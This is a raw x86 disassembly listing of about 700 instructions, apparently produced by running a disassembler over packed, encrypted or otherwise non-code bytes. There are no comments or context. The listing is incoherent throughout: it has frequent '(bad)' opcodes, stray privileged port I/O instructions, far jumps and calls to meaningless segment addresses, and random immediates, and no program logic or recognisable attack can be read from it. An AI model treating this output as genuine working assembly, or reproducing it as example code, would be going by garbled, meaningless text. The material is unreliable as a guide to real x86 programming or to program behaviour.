  415ac3:	push   eax
  415ac4:	call   0x2723:0xc8eee3e3
  415acb:	sti    
  415acc:	jp     0x415ae9
  415ace:	aad    0x39
  415ad0:	dec    esi
  415ad1:	mov    ?,WORD PTR [edi]
  415ad3:	mov    ecx,0x182c2564
  415ad8:	add    esp,eax
  415ada:	outs   dx,DWORD PTR ds:[esi]
  415adb:	clc    
  415adc:	sbb    DWORD PTR [edx+0x66],edx
  415adf:	in     al,dx
  415ae0:	xchg   ebx,eax
  415ae1:	and    al,0x92
  415ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae4:	inc    ecx
  415ae5:	mov    eax,ds:0xcc40edee
  415aea:	fs add eax,0x637fa9c4
  415af0:	mov    ss,WORD PTR [esi+0x4a85688e]
  415af6:	in     eax,dx
  415af7:	add    ebp,ecx
  415af9:	push   esp
  415afa:	addr16 xchg esp,eax
  415afc:	ins    BYTE PTR es:[edi],dx
  415afd:	push   es
  415afe:	fcomp  QWORD PTR [edi]
  415b00:	xchg   ebx,eax
  415b01:	sbb    DWORD PTR [ebx],esp
  415b03:	jo     0x415abf
  415b05:	push   esp
  415b06:	jp     0x415aca
  415b08:	lahf   
  415b09:	xchg   edx,eax
  415b0a:	fld    QWORD PTR [eax+ebp*8-0x48]
  415b0e:	inc    edx
  415b0f:	jl     0x415b8e
  415b11:	mov    dl,0xd9
  415b13:	jg     0x415b44
  415b15:	int3   
  415b16:	sbb    esp,DWORD PTR [ecx+esi*1-0x2e87b373]
  415b1d:	add    BYTE PTR [ecx+0x57c0fce5],ah
  415b23:	mov    esi,0xfdeb5446
  415b28:	mov    ?,WORD PTR [esi]
  415b2a:	inc    edi
  415b2b:	or     esi,DWORD PTR ds:0xfddd1c02
  415b31:	arpl   WORD PTR [ecx],cx
  415b33:	fincstp 
  415b35:	cmp    DWORD PTR [edi+edi*8],ebp
  415b38:	push   esp
  415b39:	dec    ebx
  415b3a:	jp     0x415ae7
  415b3c:	stos   DWORD PTR es:[edi],eax
  415b3d:	test   BYTE PTR [ebx+0x75e27fb7],0xdc
  415b44:	shl    edi,cl
  415b46:	fisttp QWORD PTR [ebx]
  415b48:	hlt    
  415b49:	popf   
  415b4a:	mov    ah,0xe1
  415b4c:	sub    eax,0xe267dd46
  415b51:	gs xchg edx,eax
  415b53:	imul   esp,eax,0x5e
  415b56:	push   edi
  415b57:	xchg   BYTE PTR [ecx+0x4f0aa269],dl
  415b5d:	sbb    edx,DWORD PTR [esi+eax*4]
  415b60:	fst    DWORD PTR [eax+eax*4+0x5263754d]
  415b67:	pop    ss
  415b68:	in     eax,dx
  415b69:	pop    ss
  415b6a:	dec    edi
  415b6b:	push   cs
  415b6c:	mov    al,ds:0x2ce955d1
  415b71:	mov    BYTE PTR [eax],cl
  415b73:	adc    ebp,ecx
  415b75:	and    edx,ebp
  415b77:	fwait
  415b78:	mov    edi,0x72e1453d
  415b7d:	sub    bh,BYTE PTR [esi+0x59e63088]
  415b83:	inc    esp
  415b84:	jmp    0x415bc2
  415b86:	xchg   DWORD PTR [ecx+eiz*8-0x22],edi
  415b8a:	in     al,0x8c
  415b8c:	pop    ecx
  415b8d:	push   ebp
  415b8e:	(bad)  
  415b8f:	jne    0x415bf2
  415b91:	arpl   si,bx
  415b93:	out    dx,al
  415b94:	aam    0xd0
  415b96:	sub    DWORD PTR [ebx],esi
  415b98:	std    
  415b99:	xchg   BYTE PTR [ebp+0x2d7b95de],cl
  415b9f:	scas   al,BYTE PTR es:[edi]
  415ba0:	test   BYTE PTR [edx+ebx*2],dl
  415ba3:	xor    eax,DWORD PTR [esi+ebp*2+0x6a]
  415ba7:	dec    esp
  415ba8:	push   cs
  415ba9:	stos   BYTE PTR es:[edi],al
  415baa:	sbb    BYTE PTR [eax+ebx*8-0x41],bl
  415bae:	and    DWORD PTR [esi+0xb],esi
  415bb1:	xor    DWORD PTR [edx-0x38],eax
  415bb4:	adc    eax,0x98000b55
  415bb9:	clc    
  415bba:	jnp    0x415c04
  415bbc:	ins    BYTE PTR es:[edi],dx
  415bbd:	and    bh,bh
  415bbf:	in     eax,dx
  415bc0:	adc    eax,0xc67eedde
  415bc5:	jmp    0x415c00
  415bc7:	adc    ecx,eax
  415bc9:	mov    esp,DWORD PTR [edi]
  415bcb:	pusha  
  415bcc:	leave  
  415bcd:	sub    DWORD PTR [eax],ebx
  415bcf:	inc    ebx
  415bd0:	or     BYTE PTR [ebx-0x558417a3],dl
  415bd6:	or     ebx,DWORD PTR [esp+ebx*1]
  415bd9:	mov    ds:0x4af5d7f7,al
  415bde:	int    0xad
  415be0:	enter  0x387a,0x44
  415be4:	dec    ebp
  415be5:	dec    edi
  415be6:	or     ah,BYTE PTR [ebx+0x217e3be5]
  415bec:	bound  ebx,QWORD PTR [edx]
  415bee:	sub    cl,0xca
  415bf1:	xor    eax,0xeb6f4dc
  415bf6:	(bad)  
  415bf7:	adc    DWORD PTR [esi+0x75],esp
  415bfa:	push   ecx
  415bfb:	or     ebp,eax
  415bfd:	xor    esp,DWORD PTR [eax+eiz*4]
  415c00:	cld    
  415c01:	out    dx,al
  415c02:	mov    ebx,0x3ad65318
  415c07:	retf   0xeaca
  415c0a:	pop    esp
  415c0b:	xchg   edi,eax
  415c0c:	or     al,0xcf
  415c0e:	cmp    eax,0x2fe5380e
  415c13:	cmp    BYTE PTR [ebx],cl
  415c15:	mov    esi,0x1bfacaa5
  415c1a:	mov    esi,0x6aac2c21
  415c1f:	mov    bh,0x67
  415c21:	xchg   ebx,eax
  415c22:	jbe    0x415ca2
  415c24:	cmp    DWORD PTR [edi-0x2e7dcad0],edx
  415c2a:	and    dl,cl
  415c2c:	adc    BYTE PTR [ecx+0x113510ce],0xe2
  415c33:	cmp    eax,0x807cd261
  415c38:	sbb    ebp,eax
  415c3a:	shr    BYTE PTR [ecx-0x2e6a92cc],1
  415c40:	clc    
  415c41:	int    0x69
  415c43:	enter  0xc3f2,0x57
  415c47:	aad    0xfb
  415c49:	mov    dl,0x7b
  415c4b:	pop    edx
  415c4c:	dec    edi
  415c4d:	(bad)  
  415c4e:	shl    dh,1
  415c50:	or     ch,BYTE PTR [ebp-0x17]
  415c53:	inc    edi
  415c54:	mov    es:0x5d3895ff,eax
  415c5a:	dec    ebx
  415c5b:	fstp   QWORD PTR [eax]
  415c5d:	pop    ds
  415c5e:	repnz sbb dh,cl
  415c61:	pop    edx
  415c62:	sbb    cl,dl
  415c64:	test   ebp,edi
  415c66:	dec    esp
  415c67:	maskmovq mm6,(bad)
  415c68:	div    DWORD PTR [edx+ebp*1-0x40]
  415c6c:	out    0x6e,eax
  415c6e:	cmp    esi,ebx
  415c70:	xor    eax,0x61c922d7
  415c75:	addr16 pop esi
  415c77:	gs dec ebp
  415c79:	(bad)  
  415c7b:	xor    eax,0x8e13a39d
  415c80:	mov    ebp,DWORD PTR [ebx+0x33]
  415c83:	sub    eax,DWORD PTR [edx-0x4b]
  415c86:	mov    al,0x5d
  415c88:	dec    edi
  415c89:	(bad)  
  415c8a:	rol    eax,cl
  415c8c:	push   ebx
  415c8d:	sbb    al,0x95
  415c8f:	mov    eax,esi
  415c91:	outs   dx,BYTE PTR ds:[esi]
  415c92:	xchg   DWORD PTR cs:[ebx-0x15],edx
  415c96:	dec    ecx
  415c97:	xor    BYTE PTR [ebp-0x22b239e5],0xe1
  415c9e:	imul   edx,DWORD PTR [esp+ebx*2+0x75aabbbb],0xd90d6f6d
  415ca9:	scas   eax,DWORD PTR es:[edi]
  415caa:	retf   
  415cab:	cs iret 
  415cad:	(bad)  
  415cae:	mov    dh,0xe
  415cb0:	mov    dh,0x8d
  415cb2:	push   esi
  415cb3:	xchg   DWORD PTR gs:[esi],eax
  415cb6:	in     eax,dx
  415cb7:	mov    eax,ds:0x16ad4d1f
  415cbc:	outs   dx,BYTE PTR ds:[esi]
  415cbd:	add    DWORD PTR [ecx+0x853110a],esp
  415cc3:	cmp    al,0xdb
  415cc5:	cmp    DWORD PTR [ecx-0x3a],esp
  415cc8:	push   ebx
  415cca:	iret   
  415ccb:	dec    ecx
  415ccc:	pusha  
  415ccd:	and    eax,ecx
  415ccf:	or     ebx,ecx
  415cd1:	std    
  415cd2:	lods   al,BYTE PTR ds:[esi]
  415cd3:	imul   ebx,DWORD PTR [edx-0x1f],0x4c
  415cd7:	jmp    0xf0eb:0xea07ef48
  415cde:	xchg   ebp,eax
  415cdf:	and    eax,0x9b49a3e8
  415ce4:	rol    al,1
  415ce6:	loopne 0x415d20
  415ce8:	jl     0x415d2e
  415cea:	adc    BYTE PTR [ecx+eax*1+0x6c33e8a2],cl
  415cf1:	push   ss
  415cf2:	mov    WORD PTR [esi+ebx*2-0x50],?
  415cf6:	push   esi
  415cf7:	xchg   esi,eax
  415cf8:	sbb    eax,0xe04373a7
  415cfd:	aam    0x31
  415cff:	dec    edi
  415d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d01:	inc    edx
  415d02:	fild   QWORD PTR [ecx+0x62accb51]
  415d08:	(bad)  
  415d09:	nop
  415d0a:	mov    ds:0x5c18fe0b,eax
  415d0f:	(bad)  
  415d10:	mov    ds:0x27de4b41,eax
  415d15:	aaa    
  415d16:	arpl   WORD PTR [ecx+0x1],di
  415d19:	fist   DWORD PTR [edx+0x3c]
  415d1c:	in     al,dx
  415d1d:	les    esp,FWORD PTR [edi]
  415d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d20:	xlat   BYTE PTR ds:[ebx]
  415d21:	mov    edx,0x4f979aed
  415d26:	jb     0x415d5c
  415d28:	dec    ebx
  415d29:	or     edi,edi
  415d2b:	loop   0x415ccc
  415d2d:	xchg   DWORD PTR [ecx+0x4148382],ecx
  415d33:	inc    esp
  415d34:	sub    cl,BYTE PTR [edi+ebx*8-0x42c2c3ce]
  415d3b:	jne    0x415cf6
  415d3d:	push   es
  415d3e:	test   eax,0xb1f4eab4
  415d43:	test   ecx,eax
  415d45:	add    al,0xc8
  415d47:	xor    al,0xb6
  415d49:	adc    BYTE PTR [esi+0x7f84734c],ch
  415d4f:	push   edi
  415d50:	xchg   DWORD PTR [edi],edi
  415d52:	test   eax,0x2b095634
  415d57:	(bad)  
  415d58:	dec    DWORD PTR [ecx-0x77]
  415d5b:	sbb    eax,0xf6f0ea9
  415d60:	mov    dl,0x54
  415d62:	cwde   
  415d63:	mov    ch,bl
  415d65:	fstp   TBYTE PTR [edx-0x3f]
  415d68:	xchg   esi,eax
  415d69:	push   edx
  415d6a:	iret   
  415d6b:	bound  ebx,QWORD PTR [edi-0x4b6fa3e1]
  415d71:	sbb    BYTE PTR [esi],ch
  415d73:	test   DWORD PTR [edi+0x7e],esp
  415d76:	dec    edx
  415d77:	dec    eax
  415d78:	jge    0x415d99
  415d7a:	xor    al,BYTE PTR ds:[ebx-0x1cea5486]
  415d81:	shl    esi,cl
  415d83:	mov    dh,0xb7
  415d85:	jg     0x415da0
  415d87:	sub    BYTE PTR [eax+0x5],ch
  415d8a:	data16 cmc 
  415d8c:	in     eax,dx
  415d8d:	xchg   DWORD PTR [ecx-0x2b12d03a],edx
  415d93:	shl    BYTE PTR [edx],0xd2
  415d96:	push   0x7e
  415d98:	(bad)  
  415d99:	jno    0x415d8f
  415d9b:	rcr    ebp,1
  415d9d:	fld    TBYTE PTR [ebp-0x4f]
  415da0:	lock iret 
  415da2:	dec    ebp
  415da3:	and    bh,bh
  415da5:	mov    al,0x9f
  415da7:	(bad)  
  415da8:	(bad)  
  415da9:	sti    
  415daa:	mov    ds:0x7ed64b3c,al
  415daf:	enter  0x87c8,0x7c
  415db3:	je     0x415db6
  415db5:	jne    0x415db6
  415db7:	adc    eax,0x507158c4
  415dbc:	jmp    0x11af:0xd6e829b2
  415dc3:	lods   eax,DWORD PTR ds:[esi]
  415dc4:	popf   
  415dc5:	stc    
  415dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dc7:	nop
  415dc8:	xor    bh,ch
  415dca:	jns    0x415e42
  415dcc:	sbb    eax,0xdcbc2ee4
  415dd1:	jbe    0x415e22
  415dd3:	lea    ecx,[eax+0x58dfdf3f]
  415dd9:	es scas al,BYTE PTR es:[edi]
  415ddb:	xchg   ebp,eax
  415ddc:	add    eax,0x507ebf5e
  415de1:	push   0xffffff88
  415de3:	(bad)  
  415de4:	mov    edi,0xfa98e6a6
  415de9:	mov    bl,0xbc
  415deb:	jno    0x415e5e
  415ded:	hlt    
  415dee:	leave  
  415def:	xchg   ecx,eax
  415df0:	mov    esp,0x7446f2c4
  415df5:	inc    esp
  415df6:	sbb    al,0xb2
  415df8:	xor    DWORD PTR [eax+0x1f26f6fa],0xffffffe2
  415dff:	hlt    
  415e00:	xchg   ah,cl
  415e02:	sbb    BYTE PTR [eax],bh
  415e04:	and    DWORD PTR cs:[edx-0x15c4bd2a],0x11
  415e0c:	mov    ebx,0x22cf73cf
  415e11:	pop    ss
  415e12:	icebp  
  415e13:	or     DWORD PTR [esi+0x74f42f44],ecx
  415e19:	rep stos DWORD PTR es:[edi],eax
  415e1b:	imul   BYTE PTR [eax+0x464be85]
  415e21:	add    cl,bh
  415e23:	jb     0x415dd3
  415e25:	or     eax,DWORD PTR [esi+0x24]
  415e28:	lahf   
  415e29:	mov    ebp,0x9d743579
  415e2e:	cld    
  415e2f:	push   cs
  415e30:	xchg   ebp,eax
  415e31:	mov    dl,0xff
  415e33:	mov    eax,ds:0x83696be
  415e38:	add    ebp,DWORD PTR [ebx-0x252ad8f3]
  415e3e:	and    edi,DWORD PTR [eax-0x49c2dcee]
  415e44:	outs   dx,DWORD PTR ds:[esi]
  415e45:	loope  0x415e8b
  415e47:	ins    DWORD PTR es:[edi],dx
  415e48:	inc    edx
  415e49:	jecxz  0x415dfd
  415e4b:	loope  0x415eb0
  415e4d:	gs jl  0x415ecc
  415e50:	(bad)  
  415e52:	icebp  
  415e53:	sahf   
  415e54:	imul   ebp,DWORD PTR ss:[ebp-0x879d593],0xffffff85
  415e5c:	push   es
  415e5d:	jle    0x415eb4
  415e5f:	pop    edx
  415e60:	clc    
  415e61:	mov    bl,0x2b
  415e63:	sub    BYTE PTR [edx],ah
  415e65:	repz add DWORD PTR [eax+0x36],ebx
  415e69:	cmp    DWORD PTR [ebp-0x5d],eax
  415e6c:	or     bh,BYTE PTR [eax]
  415e6e:	rcr    ch,1
  415e70:	jmp    0xc189:0x61cfae5d
  415e77:	mov    al,0x15
  415e79:	and    BYTE PTR [esi+edi*8],cl
  415e7c:	mov    ?,ecx
  415e7e:	mov    dl,0xe6
  415e80:	imul   ebp,DWORD PTR [esi+0x20d71f62],0x2afec1cf
  415e8a:	ins    BYTE PTR es:[edi],dx
  415e8b:	mov    ds:0xf2b1bd71,eax
  415e90:	jb     0x415e5e
  415e92:	iret   
  415e93:	out    dx,al
  415e94:	jp     0x415f0e
  415e96:	push   es
  415e97:	adc    BYTE PTR [eax-0x455fcf4e],ah
  415e9d:	add    BYTE PTR [ecx+eiz*8-0x441a240f],al
  415ea4:	mov    dl,0x7d
  415ea6:	push   edx
  415ea7:	inc    ebx
  415ea8:	sbb    cl,BYTE PTR [esi]
  415eaa:	int3   
  415eab:	prefetch (bad)
  415eac:	or     eax,0xe8953ddd
  415eb1:	aaa    
  415eb2:	xchg   ecx,eax
  415eb3:	ror    DWORD PTR [eax+0x19],cl
  415eb6:	das    
  415eb7:	repz imul ebp,DWORD PTR [edi+0x1a],0x1
  415ebc:	stos   DWORD PTR es:[edi],eax
  415ebd:	dec    eax
  415ebe:	mov    esp,0x2a93adb
  415ec3:	iret   
  415ec4:	test   eax,0x59999eb9
  415ec9:	fimul  DWORD PTR [eax+0x73]
  415ecc:	aaa    
  415ecd:	pop    ecx
  415ece:	sub    DWORD PTR [eax+0x4eb71cc1],edi
  415ed4:	pop    ebx
  415ed5:	pop    esp
  415ed6:	mov    WORD PTR [ecx],?
  415ed8:	push   ebx
  415ed9:	or     al,0x46
  415edb:	mov    ebp,0xd07eff7
  415ee0:	(bad)
  415ee3:	loopne 0x415f56
  415ee5:	dec    ecx
  415ee6:	or     BYTE PTR [esi-0x71],0xfa
  415eea:	jge    0x415eef
  415eec:	mov    ebp,0x4fa53163
  415ef1:	test   eax,0xe064f9a1
  415ef6:	add    dl,BYTE PTR [ebx]
  415ef8:	and    bh,ah
  415efa:	add    BYTE PTR [ecx+0x3b7c2f42],al
  415f00:	cmp    al,0xb7
  415f02:	sbb    eax,0x4c64b3f1
  415f07:	test   BYTE PTR [edx-0x10e3810],bl
  415f0d:	cmp    ecx,DWORD PTR [eax]
  415f0f:	xor    bh,dh
  415f11:	dec    ebp
  415f12:	dec    ecx
  415f13:	aas    
  415f14:	(bad)  
  415f15:	mov    ch,0x6d
  415f17:	addr16 stc 
  415f19:	enter  0x2ac1,0x2e
  415f1d:	xor    eax,DWORD PTR [esi-0x35]
  415f20:	lods   eax,DWORD PTR ds:[esi]
  415f21:	mov    ds:0x9e82c5f0,eax
  415f26:	adc    al,0xb0
  415f28:	out    dx,al
  415f29:	fidiv  WORD PTR ds:[esi]
  415f2c:	pusha  
  415f2d:	mov    ch,0x78
  415f2f:	aam    0xb0
  415f31:	pushf  
  415f32:	mov    ebx,0x6e3ceea1
  415f37:	loopne 0x415f44
  415f39:	sti    
  415f3a:	push   ss
  415f3b:	inc    esp
  415f3c:	clc    
  415f3d:	mul    BYTE PTR fs:[eax]
  415f40:	ins    BYTE PTR es:[edi],dx
  415f41:	aaa    
  415f42:	in     eax,0x3b
  415f44:	iret   
  415f45:	sbb    ebx,edi
  415f47:	jmp    0x3296:0xe897f1b9
  415f4e:	cwde   
  415f4f:	mov    cl,BYTE PTR [edi]
  415f51:	inc    edi
  415f52:	pop    ds
  415f53:	xchg   edx,eax
  415f54:	dec    esp
  415f55:	int3   
  415f56:	inc    edi
  415f57:	jb     0x415f09
  415f59:	sar    DWORD PTR [edx+0x43],1
  415f5c:	in     al,dx
  415f5d:	cmp    al,0x6f
  415f5f:	stos   DWORD PTR es:[edi],eax
  415f60:	pusha  
  415f61:	mov    ch,0xa1
  415f63:	rcr    edx,cl
  415f65:	dec    esi
  415f66:	(bad)  
  415f67:	imul   esi,esp,0xfffffff2
  415f6a:	or     BYTE PTR [esp+eax*2],0x60
  415f6e:	jecxz  0x415fae
  415f70:	pop    esi
  415f71:	and    ebx,esp
  415f73:	inc    esp
  415f74:	popa   
  415f75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f76:	push   ds
  415f77:	test   DWORD PTR ds:0x61424162,0x30608771
  415f81:	mov    DWORD PTR ds:0x1640a659,ebx
  415f87:	fcom   DWORD PTR [ebx+edi*2-0x38]
  415f8b:	sbb    ch,BYTE PTR [eiz*4+0x2ef2cac5]
  415f92:	shl    DWORD PTR [eax-0x37368b0c],1
  415f98:	out    0xed,eax
  415f9a:	cld    
  415f9b:	(bad)  
  415f9c:	call   0x655b:0xd38bc03e
  415fa3:	jb     0x415f65
  415fa5:	pop    ss
  415fa6:	leave  
  415fa7:	push   cs
  415fa8:	jae    0x415f2e
  415faa:	adc    eax,0x6bfe7a7a
  415faf:	push   ebp
  415fb0:	fwait
  415fb1:	adc    al,al
  415fb3:	dec    DWORD PTR ds:0x574b3e64
  415fb9:	std    
  415fba:	xchg   BYTE PTR [ebp-0x26a8c2d1],bh
  415fc0:	push   edi
  415fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fc2:	call   0xf5bf:0xe57c2c1b
  415fc9:	push   ss
  415fca:	inc    edx
  415fcb:	mov    ebx,0x1bed925a
  415fd0:	dec    ebx
  415fd1:	jno    0x415fd8
  415fd3:	adc    BYTE PTR [edi+eiz*2+0x11],0xa9
  415fd8:	in     eax,0x9e
  415fda:	shl    esp,1
  415fdc:	loope  0x415fff
  415fde:	call   0xf31e:0x376474ef
  415fe5:	mov    bl,0xae
  415fe7:	add    eax,0xf0f8d962
  415fec:	or     esp,DWORD PTR [eax-0x2ccd2ec3]
  415ff2:	mov    esi,0x31f50762
  415ff7:	(bad)  
  415ffa:	cs rcl al,cl
  415ffd:	xchg   BYTE PTR [esi],dl
  415fff:	add    BYTE PTR [ecx-0x64],ah
  416002:	rcr    DWORD PTR [edi],cl
  416004:	cld    
  416005:	inc    esp
  416006:	aam    0xcc
  416008:	sub    bl,bl
  41600a:	stos   BYTE PTR es:[edi],al
  41600b:	sub    dh,0x5d
  41600e:	jecxz  0x416081
  416010:	mov    ss:0xe2df3bd3,eax
  416016:	inc    ecx
  416017:	adc    DWORD PTR [edx+0x51],ecx
  41601a:	add    BYTE PTR [ebx],dl
  41601c:	imul   esi,ecx,0xffffffef
  41601f:	(bad)  
  416020:	jae    0x41605b
  416022:	sub    al,0x5d
  416024:	stos   DWORD PTR es:[edi],eax
  416025:	pop    ecx
  416026:	and    al,0xdf
  416028:	je     0x416048
  41602a:	test   DWORD PTR [edi+edi*4],eax
  41602d:	mov    eax,0x1b60dc95
  416032:	cmp    eax,0xf56f132f
  416037:	fidiv  DWORD PTR [eax+0x27]
  41603a:	mov    eax,0x555350dd
  41603f:	call   0xb6283abf
  416044:	fdiv   DWORD PTR [edi]
  416046:	mov    ch,0xf2
  416048:	test   al,0x7e
  41604a:	mov    eax,ds:0xd7e7f4f6
  41604f:	in     al,dx
  416050:	inc    ebp
  416051:	push   0x4ff16c61
  416056:	imul   ebx,ebp,0xffffff82
  416059:	add    eax,0xf0dd5edd
  41605e:	mov    DWORD PTR [edx],ecx
  416060:	jmp    0x41606f
  416062:	inc    edx
  416063:	sbb    eax,DWORD PTR [edi-0x19964326]
  416069:	sti    
  41606a:	loopne 0x41607d
  41606c:	add    esi,DWORD PTR [edi+0x20]
  41606f:	jmp    0x4160af
  416071:	pusha  
  416072:	mov    bl,0x22
  416074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416075:	cmp    al,0xb2
  416077:	ret    0x2f1
  41607a:	cdq    
  41607b:	call   0x5a9:0x735c639
  416082:	mov    edi,0xd4a504dd
  416087:	xor    BYTE PTR [esi+esi*8+0x29480bb7],bl
  41608e:	inc    ebp
  41608f:	test   BYTE PTR [ebx+0x63],cl
  416092:	in     eax,0xda
  416094:	in     al,0x6a
  416096:	call   0xd49157e
  41609b:	xchg   edx,eax
  41609c:	cmp    al,0xde
  41609e:	mov    cl,0xe9
  4160a0:	data16 mov bl,0xc1
  4160a3:	sub    al,0x6f
  4160a5:	dec    ecx
  4160a6:	pop    esp
  4160a7:	(bad)
  4160aa:	push   edx
  4160ab:	xor    DWORD PTR [esi-0x79],0xfc9241d1
  4160b2:	fadd   DWORD PTR [ebx+0x6c]
  4160b5:	ja     0x4160bd
  4160b7:	mov    esp,0x98198a06
  4160bc:	ins    DWORD PTR es:[edi],dx
  4160bd:	inc    edx
  4160be:	aas    
  4160bf:	ja     0x416085
  4160c1:	in     al,0x52
  4160c3:	push   ebp
  4160c4:	mov    BYTE PTR [eax],dh
  4160c6:	(bad)  
  4160c7:	lock ja 0x41613b
  4160ca:	test   bl,0x23
  4160cd:	ret    0xb0bb
  4160d0:	adc    DWORD PTR [edx+0xf],0xec0b958
  4160d7:	adc    dl,BYTE PTR [esi]
  4160d9:	lods   eax,DWORD PTR ds:[esi]
  4160da:	xor    eax,0x97b90769
  4160df:	sub    DWORD PTR [edi-0x31],ebp
  4160e2:	test   DWORD PTR [edx+ebp*8+0x9296ae8],0x5dc3019e
  4160ed:	mov    DWORD PTR [edx],esp
  4160ef:	lds    ebx,FWORD PTR [ecx+0x6037a3fe]
  4160f5:	xor    BYTE PTR [edi+0x4f],dh
  4160f8:	mov    eax,ds:0xa199e7ed
  4160fd:	mov    edx,0x9373e704
  416102:	xchg   esp,eax
  416103:	sbb    eax,0x9a869986
  416108:	loope  0x416169
  41610a:	xor    eax,esp
  41610c:	jo     0x41612c
  41610e:	loop   0x416100
  416110:	iret   
  416111:	pop    es
  416112:	(bad)  
  416113:	dec    eax
  416114:	les    ecx,FWORD PTR [edx-0x4d8d2861]
  41611a:	leave  
  41611b:	dec    eax
  41611c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41611d:	mov    al,0x94
  41611f:	aaa    
  416120:	xor    al,0x66
  416122:	push   ebp
  416123:	xor    edx,eax
  416125:	jg     0x4160e0
  416127:	push   ebp
  416128:	in     eax,dx
  416129:	mov    dh,bl
  41612b:	shl    BYTE PTR [eax-0x3d25135c],1
  416131:	pushf  
  416132:	add    eax,DWORD PTR [esi+0x4e]
  416135:	pop    ebx
  416136:	sbb    BYTE PTR ds:0xd2f06d2c,bh
  41613c:	rol    BYTE PTR [eax+ebp*4],cl
  41613f:	or     ah,BYTE PTR [ecx]
  416141:	ror    BYTE PTR ds:0x558e4748,cl
  416147:	jp     0x416157
  416149:	lds    esi,FWORD PTR [ecx-0x25]
  41614c:	arpl   WORD PTR [ebx],bp
  41614e:	loope  0x41613b
  416150:	(bad)  
  416151:	dec    eax
  416152:	mov    ebx,0xe1ebf7e4
  416157:	into   
  416158:	fwait
  416159:	inc    ecx
  41615a:	xchg   esp,eax
  41615b:	in     eax,dx
  41615c:	sbb    DWORD PTR [esi],ebp
  41615e:	inc    ebp
  41615f:	adc    esi,DWORD PTR ss:[eax]
  416162:	jg     0x416188
  416164:	(bad)  
  416165:	sbb    eax,0x87fd8a84
  41616a:	sar    BYTE PTR [ebp+0x5f],cl
  41616d:	inc    edx
  41616e:	es js  0x416156
  416171:	mov    ds:0xdbaf3393,eax
  416176:	shr    BYTE PTR [edx],0x7c
  416179:	mov    edi,0xa8b13d78
  41617e:	mov    ch,0xdb
  416180:	pop    ebx
  416181:	xchg   esp,eax
  416182:	stc    
  416183:	into   
  416184:	call   0x5fa6:0xb4fede05
  41618b:	gs pop ds
  41618d:	inc    edi
  41618e:	jmp    0x416193
  416190:	push   edi
  416191:	push   edx
  416192:	jge    0x41618a
  416194:	push   ebp
  416195:	test   ch,ch
  416197:	mov    al,0x8c
  416199:	xchg   esi,eax
  41619a:	into   
  41619b:	fmul   QWORD PTR [ebp+0xc]
  41619e:	xchg   edx,eax
  41619f:	hlt    
  4161a0:	rol    BYTE PTR [edx+0x2997a756],0x63
  4161a7:	ficomp DWORD PTR [eax+0x1a3180f]
  4161ad:	cli    
  4161ae:	mov    edi,0x4e5091a9
  4161b3:	js     0x41617d
  4161b5:	ds (bad) 
  4161b7:	and    eax,0x6792d78e
  4161bc:	popa   
  4161bd:	out    dx,al
  4161be:	leave  
  4161bf:	mov    al,0x68
  4161c1:	ret    0x5823
  4161c4:	mov    ecx,0xb79025c4
  4161c9:	ja     0x416222
  4161cb:	repz sub al,0x5f
  4161ce:	and    bl,BYTE PTR [esi-0x40]
  4161d1:	jmp    0x416220
  4161d3:	mov    DWORD PTR [esi+0x1e6d0e78],edx
  4161d9:	(bad)  
  4161da:	or     al,0xb7
  4161dc:	cli    
  4161dd:	sub    cl,BYTE PTR [eax+0x15]
  4161e0:	mov    eax,ds:0xd1bc9cc
  4161e5:	mov    eax,ds:0xc7eba840
  4161ea:	mov    ebx,0x203d7ec9
  4161ef:	mov    eax,ds:0x9510a73f
  4161f4:	mov    dl,0x92
  4161f6:	push   cs
  4161f7:	js     0x416208
  4161f9:	jge    0x41626a
  4161fb:	ins    BYTE PTR es:[edi],dx
  4161fc:	adc    DWORD PTR [ecx-0x7a98f4ca],edi
  416202:	nop
  416203:	jnp    0x416205
  416205:	mov    dl,0xf3
  416207:	push   eax
  416208:	jmp    0x1680:0xc654598c
  41620f:	lock xchg edi,eax
  416211:	(bad)  
  416212:	push   0xd6d7fc8d
  416217:	mov    ecx,0x8e88b31a
  41621c:	xor    BYTE PTR [esi+0x50d999e1],bl
  416222:	jg     0x41620c
  416224:	push   cs
  416225:	imul   eax,DWORD PTR [ebx],0xb7958cea
  41622b:	xchg   ecx,eax
  41622c:	in     al,0x9b
  41622e:	and    dl,BYTE PTR [edi]
  416230:	retf   0x454a
  416233:	icebp  
  416234:	pop    ebp
  416235:	pop    ecx
  416236:	or     al,0x1c
  416238:	or     esp,eax
  41623a:	(bad)
  41623d:	ror    DWORD PTR [ebp+0x11a308d7],cl
  416243:	cs mov al,0x74
  416246:	jbe    0x4162ad
  416248:	mov    eax,ds:0xa9e0eaa2
  41624d:	call   0x760972a3
  416252:	std    
  416253:	sub    BYTE PTR [ebx-0x589874d1],dl
  416259:	or     eax,0x435066ea
  41625e:	nop
  41625f:	nop
  416260:	aas    
  416261:	sbb    esi,DWORD PTR ds:0xb56fb5c5
  416267:	and    al,BYTE PTR [edi]
  416269:	push   cs
  41626a:	imul   eax,DWORD PTR [eax+edx*8+0x231532c2],0x232946c8
  416275:	jg     0x41623d
  416277:	in     al,0x69
  416279:	pop    ecx
  41627a:	or     dh,BYTE PTR [esi+0x1040033a]
  416280:	jae    0x4162b7
  416282:	xchg   esp,eax
  416283:	dec    edi
  416284:	cwde   
  416285:	lahf   
  416286:	pop    eax
  416287:	mov    BYTE PTR [eax-0x6afce89],ah
  41628d:	add    bl,BYTE PTR [ebx-0x699e5eeb]
  416293:	add    al,BYTE PTR [eax+esi*1]
  416296:	shr    ch,0x85
  416299:	out    0x36,al
  41629b:	or     DWORD PTR [ecx+0x6],ebp
  41629e:	fs mov bh,0x7e
  4162a1:	int3   
  4162a2:	xchg   ch,bl
  4162a4:	das    
  4162a5:	fst    QWORD PTR [edx]
  4162a7:	dec    edx
  4162a8:	mov    dl,0x30
  4162aa:	add    DWORD PTR [ebx+0x8],eax
  4162ad:	test   DWORD PTR [edx*1-0x295fe0c9],0xfd2852ba
  4162b8:	or     edx,DWORD PTR [esi+esi*2-0x408e384b]
  4162bf:	sahf   
  4162c0:	jnp    0x41624a
